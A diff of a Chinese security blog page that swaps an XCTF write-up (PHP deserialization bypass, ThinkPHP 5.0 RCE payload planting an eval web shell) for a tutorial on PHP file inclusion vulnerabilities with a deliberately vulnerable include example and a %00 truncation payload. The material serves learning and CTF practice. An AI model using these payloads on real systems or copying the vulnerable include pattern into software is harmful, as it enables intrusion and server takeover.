@@ -7,7 +7,7 @@
 
     
 
-    <title>XCTF训练write up | 2h0nG&#39;s Blog</title>
+    <title>文件包含漏洞 | 2h0nG&#39;s Blog</title>
     <meta name="author" content="John Doe">
     
     <meta name="description" content="Love is friendship fell into love">
@@ -15,7 +15,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-    <meta property="og:title" content="XCTF训练write up"/>
+    <meta property="og:title" content="文件包含漏洞"/>
     <meta property="og:site_name" content="2h0nG&#39;s Blog"/>
 
     
@@ -196,7 +196,7 @@
 
             <li class="collapse-level-0" collapse-level="0">
                 <a class="no-padding" href="/categories/Web渗透测试/">
-                    Web渗透测试 <span class="right">17 篇</span></a>
+                    Web渗透测试 <span class="right">18 篇</span></a>
                 </a>
             </li>
 
@@ -256,7 +256,7 @@
             
     
     
-    <a class="breadcrumb" href="/categories/CTF笔记/">CTF笔记</a>
+    <a class="breadcrumb" href="/categories/Web渗透测试/">Web渗透测试</a>
 
 
         
@@ -273,12 +273,12 @@
             <div class="article-title">
                 
     
-        <h1>XCTF训练write up</h1>
+        <h1>文件包含漏洞</h1>
     
 
 
             </div>
-            <time class="pink-link-context" datetime="2020-09-01T09:25:16.000Z"><a href="/2020/09/01/CTF%E7%AC%94%E8%AE%B0/XCTF%E8%AE%AD%E7%BB%83write%20up/">2020-09-01</a></time>
+            <time class="pink-link-context" datetime="2020-09-02T02:45:33.000Z"><a href="/2020/09/02/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/18%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">2020-09-02</a></time>
 
             <span id="busuanzi_container_page_pv" class="read-times-container">
     <i class="fa fa-eye"></i>
@@ -288,49 +288,44 @@
             
     <div class="tags-row">
         
-            <a href="/tags/CTF笔记/" class="chip pink lighten-1">CTF笔记</a>
+            <a href="/tags/Web渗透测试/" class="chip pink lighten-1">Web渗透测试</a>
         
     </div>
 
 
             <div class="toc pink-link-context hide-on-med-and-down">
-    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#XCTF%E8%AE%AD%E7%BB%83write-up"><span class="section table-of-contents-text">XCTF训练write up</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#1%E3%80%81Web-php-unserialize"><span class="section table-of-contents-text">1、Web_php_unserialize</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#2%E3%80%81php-rce%EF%BC%88thinkphp5-0-RCE%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="section table-of-contents-text">2、php_rce（thinkphp5.0 RCE漏洞）</span></a></li></ol></li></ol>
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="section table-of-contents-text">文件包含漏洞</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%80%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="section table-of-contents-text">一、文件包含漏洞概述</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABPHP%E5%87%BD%E6%95%B0"><span class="section table-of-contents-text">二、文件包含PHP函数</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="section table-of-contents-text">三、漏洞产生的原因</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%9B%9B%E3%80%81PHP%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE"><span class="section table-of-contents-text">四、PHP相关配置</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%94%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%89%B9%E7%82%B9"><span class="section table-of-contents-text">五、文件包含漏洞的特点</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%85%AD%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C"><span class="section table-of-contents-text">六、文件包含漏洞实验</span></a></li></ol></li></ol>
 </div>
 
 
             <div class="entry pink-link-context">
-                <h2 id="XCTF训练write-up"><a href="#XCTF训练write-up" class="headerlink" title="XCTF训练write up"></a>XCTF训练write up</h2><h3 id="1、Web-php-unserialize"><a href="#1、Web-php-unserialize" class="headerlink" title="1、Web_php_unserialize"></a>1、Web_php_unserialize</h3><p>题目源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; <span class="comment">//反序列化后会调用此函数，反序列化的对象属性个数错误时，会绕过此函数。CVE-2016-7124</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+                <h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><h3 id="一、文件包含漏洞概述"><a href="#一、文件包含漏洞概述" class="headerlink" title="一、文件包含漏洞概述"></a>一、文件包含漏洞概述</h3><p>​    程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某个函数的时候，直接调用该文件，无需再次编写，这种调用文件的过程通常称为包含。</p>
+<p>​    而程序开发人员都希望代码更加灵活，所以通常会把被包含的文件设置为变量，来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用任意文件，造成文件包含漏洞。</p>
+<p>​    几乎所有的脚本语言都会提供文件包含功能。文件包含漏洞在PHP Web Application中居多，在JSP/ASP/ASP。net程序中比较少。</p>
+<h3 id="二、文件包含PHP函数"><a href="#二、文件包含PHP函数" class="headerlink" title="二、文件包含PHP函数"></a>二、文件包含PHP函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;&quot;</span>) / <span class="keyword">include</span> <span class="string">&quot;&quot;</span>    <span class="comment">#如果包含文件不存在，产生警告，后续语句仍然执行</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;&quot;</span>) / <span class="keyword">include_once</span> <span class="string">&quot;&quot;</span>    <span class="comment">#同include（），所包含的文件只能在当前页面被包含一次</span></span><br><span class="line"><span class="keyword">require</span>()    <span class="comment">#如果包含文件不存在，产生错误，后续语句不执行</span></span><br><span class="line"><span class="keyword">require_once</span>()    <span class="comment">#同require（），所包含的文件在当前页面只被包含一次</span></span><br></pre></td></tr></table></figure>
 
-<p><strong>Write Up：</strong>此题主要考察两个点。1、php反序列化漏洞；2、preg_match的函数绕过。</p>
-<p>1、通过php反序列化漏洞首先得到我们希望执行的Payload：</p>
-<p><code>?var = O:4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code>，这里重点时对象的属性数量错误，绕过wakeup。</p>
-<p>2、绕过preg_match正则表达式的匹配。</p>
-<p>源码：<code>preg_match(&#39;/[oc]:\d+:/i&#39;, $var)</code>，匹配的是 -&gt; O/C : 任意数字：这种字符串，且大小写都可。这里我傻了，其实只要4前加一个+即可，Payload:</p>
-<p><code>?var = O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p>
-<p><strong>Flag：</strong></p>
-<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/dxG2ZT"><img src="https://s1.ax1x.com/2020/09/01/dxG2ZT.png" alt="dxG2ZT.png"></a></p>
-<h3 id="2、php-rce（thinkphp5-0-RCE漏洞）"><a href="#2、php-rce（thinkphp5-0-RCE漏洞）" class="headerlink" title="2、php_rce（thinkphp5.0 RCE漏洞）"></a>2、php_rce（thinkphp5.0 RCE漏洞）</h3><blockquote>
-<p>漏洞影响范围：5.1 &lt;= 5.1.32 / 5.0 &lt;= 5.0.23</p>
-</blockquote>
-<p><a target="_blank" rel="noopener" href="https://0kee.360.cn/blog/thinkphp-5-x-rce-%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%e4%b8%8e%e5%88%a9%e7%94%a8%e6%80%bb%e7%bb%93/">https://0kee.360.cn/blog/thinkphp-5-x-rce-%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%e4%b8%8e%e5%88%a9%e7%94%a8%e6%80%bb%e7%bb%93/</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/12622077.html">https://www.cnblogs.com/zpchcbd/p/12622077.html</a></p>
-<p>Payload:</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=zxc1.php&amp;vars[1][]=&lt;?php @eval($_POST[zjc]);?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="三、漏洞产生的原因"><a href="#三、漏洞产生的原因" class="headerlink" title="三、漏洞产生的原因"></a>三、漏洞产生的原因</h3><p>1、Web应用实现了动态包含</p>
+<p>2、动态包含的文件路径参数，客户端可控  </p>
+<h3 id="四、PHP相关配置"><a href="#四、PHP相关配置" class="headerlink" title="四、PHP相关配置"></a>四、PHP相关配置</h3><p>1、关于PHP操作远程文件的配置（远程文件包含）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen&#x3D;On&#x2F;Off</span><br><span class="line">allow_url_inclode&#x3D;On&#x2F;Off</span><br></pre></td></tr></table></figure>
+
+<h3 id="五、文件包含漏洞的特点"><a href="#五、文件包含漏洞的特点" class="headerlink" title="五、文件包含漏洞的特点"></a>五、文件包含漏洞的特点</h3><p>使用PHP文件包含函数包含的文件，<strong>无论该文件是什么拓展名或者类型，都会作为php文件进行解析</strong>。</p>
+<h3 id="六、文件包含漏洞实验"><a href="#六、文件包含漏洞实验" class="headerlink" title="六、文件包含漏洞实验"></a>六、文件包含漏洞实验</h3><p>1、00截断的利用（PHP&lt;5.3.4 &amp;&amp; 关闭魔术引号配置 magic_quotes_gpc）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;path&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">include</span> $_GET[<span class="string">&#x27;path&#x27;</span>].<span class="string">&quot;.html&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Not Have arGc&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">]))</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#采用%00截断可使其绕过后面的.html， Payload: ?path=info.php%00</span></span><br></pre></td></tr></table></figure>
 
 
                 
 <p class="pink-link-context">
-    <a href="/2020/09/01/CTF%E7%AC%94%E8%AE%B0/SQLi-lab/" rel="next" title="SQLi-labs">
-    上一篇：SQLi-labs
+    <a href="/2020/09/06/CTF%E7%AC%94%E8%AE%B0/XCTF%E8%AE%AD%E7%BB%83write%20up/" rel="next" title="XCTF训练write up">
+    上一篇：XCTF训练write up
   </a>
 </p>
 
 
 
 <p class="pink-link-context">
-    <a href="/2020/09/01/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/17%E3%80%81PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="PHP反序列化漏洞">
-    下一篇：PHP反序列化漏洞
+    <a href="/2020/09/01/CTF%E7%AC%94%E8%AE%B0/SQLi-lab/" rel="next" title="SQLi-labs">
+    下一篇：SQLi-labs
   </a>
 </p>
 
